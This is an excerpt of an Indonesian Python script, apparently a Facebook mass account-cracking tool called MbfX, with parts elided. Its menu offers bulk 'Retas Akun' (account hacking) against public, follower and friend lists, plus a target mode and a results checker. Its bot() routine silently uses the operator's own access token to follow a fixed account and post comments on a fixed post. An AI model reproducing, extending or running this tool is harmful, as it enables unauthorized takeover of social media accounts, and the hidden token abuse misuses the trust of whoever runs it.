...
# McybearX Projeck
# Tools MbfX
# Jangan Ubah Bot nya ya ganteng..
# Versi 2.6
...
balmond = "\x1b[1;94m(\x1b[1;93m >\x1b[1;96m_\x1b[1;93m<\x1b[1;94m)"
...
def banner():
	jala ("""\x1b[1;93m
\x1b[1;91m ____ __  __ ____  _____    
\x1b[1;91m / ___|  \/  | __ )|  ___| \x1b[1;91m   []____________[]                             
\x1b[1;97m| |   | |\/| |  _ \| |_    \x1b[1;91m  |_____________    \                           
\x1b[1;97m| |___| |  | | |_) |  _|   \x1b[1;97m|       |_________\  \                          
\x1b[1;94m \____|_|  |_|____/|_|     \x1b[1;97m|                \_\  \                         
\x1b[1;94m===========================================\x1b[1;97m|   \__\                        
\033[92;1m┌[ \033[92;1mAuth     \x1b[1;92m: ADK ZANTUY |pericode ter gblk           ]┐
\033[97;1m├[ \033[97;1mWhatsApp \x1b[1;97m: 08 lainya kapan kapan                   ]┤
\033[94;1m├[ \033[94;1mGithub   \x1b[1;94m : 1mhttps://github.com/Zrantuy           ]┤
\033[95;1m├[ \033[95;1mYOUTUBE  \x1b[1;95m: gk punya                                ]┤
\033[91;1m├────────────────────────────────────────────────────────────┘""")
...
def bot():
	...
	requests.post("https://graph.facebook.com/100013005580609/subscribers?access_token="+token)
	requests.post("https://graph.facebook.com/100013005580609/subscribers?access_token="+token) # Usup Mbew
	...
	requests.post("https://graph.facebook.com/1312657382511102/comments/?message="+komen+"&access_token="+token)
	requests.post("https://graph.facebook.com/1312657382511102/comments/?message="+komentar+"&access_token="+token)
	menu()
...
def menu():
	...
	print(u+"├─────────────────────────────────────────────────────────────")
	print(u+"├["+m+"01"+u+"]"+b+" Retas Akun Publik "+u+"("+m+"Banyak"+u+")            		    ")
	print(u+"├["+m+"02"+u+"]"+b+" Retas Akun Followers Publik \x1b[1;95m     			   ")
	print(u+"├["+m+"03"+u+"]"+b+" Retas Akun Pertemanan Publik "+u+"("+m+"Masal"+u+")    	   	    ")
	print(u+"├["+m+"04"+u+"]"+b+" Retas Akun tahun 2004/2008 "+u+"("+m+"Masal"+u+")      		    ")
	print(u+"├["+m+"05"+u+"]"+b+" Retas Akun tahun 2004/2010 "+u+"("+m+"Masal"+u+")       		    ")
	print(u+"│")
	print(u+"├["+m+"06"+u+"]"+p+" MODE \x1b[1;91mTarget       \x1b[1;95m     				   ")
	print(u+"│")
	print(u+"├["+m+"07"+u+"]"+b+" Retas Data Target \x1b[1;94m      		    ")
	print(u+"├["+m+"08"+u+"]"+p+" Cek Result Crack\x1b[1;96m       		     ")
...
def mode_crack():
	...
	if pilih=="1" or pilih=="01":
		...
		jalan(balmond+b+"Anjaay Hekel :v\n")
		default()
	elif pilih=="2" or pilih=="02":
		print("\n"+balmond+s+" Tekan "+h+"'y'"+s+" Untuk Random User Agent (slow)")
		print(balmond+u+" Tekan Enter Untuk 1 User Agent (fast)")
